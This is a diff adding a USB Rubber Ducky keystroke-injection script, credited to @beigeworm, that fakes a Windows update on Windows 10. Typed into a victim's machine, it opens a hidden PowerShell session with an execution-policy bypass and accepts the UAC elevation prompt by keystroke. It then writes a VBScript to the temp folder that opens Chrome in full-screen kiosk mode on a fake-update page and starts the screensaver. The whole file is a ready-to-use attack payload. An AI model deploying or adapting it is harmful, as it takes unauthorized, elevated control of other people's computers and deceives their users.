@@ -1,0 +1,44 @@
+REM Title: Invoke Fake Windows Update
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to create a .vbs script to open Chrome and fullscreen.
+REM Target: Windows 10
+
+REM some setup for dukie script.
+DEFAULT_DELAY 200
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM create the .vbs script to start chrome and go fullscreen.
+STRING cmd
+ENTER
+STRING cd $env:temp
+ENTER
+STRING copy con update.vbs
+ENTER
+STRING Set WshShell = WScript.CreateObject("WScript.Shell")
+ENTER
+STRING WshShell.Run "chrome.exe -new--window -kiosk https://fakeupdate.net/win8", 1, False
+ENTER
+STRING WshShell.Run "C:\Windows\System32\scrnsave.scr /s"
+ENTER
+STRING WScript.Sleep 200
+ENTER
+STRING WshShell.SendKeys "{F11}"
+ENTER
+CTRL z
+ENTER
+STRING start update.vbs
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 1000
+
+
